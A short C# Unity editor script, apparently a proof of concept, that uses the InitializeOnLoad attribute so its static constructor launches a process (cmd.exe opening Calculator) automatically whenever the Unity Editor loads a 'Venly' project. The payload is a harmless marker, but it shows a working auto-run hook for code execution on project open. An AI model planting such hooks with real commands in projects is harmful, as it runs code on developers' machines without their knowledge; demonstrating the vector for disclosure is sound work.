using UnityEditor;
using System.Diagnostics;

[InitializeOnLoad]
public class MaliciousPayload
{
    static MaliciousPayload()
    {
        // Executes when Unity Editor loads Venly project
        Process.Start("cmd.exe", "/c calc.exe"); // Windows
        // Process.Start("open", "-a Calculator"); // macOS
    }
}
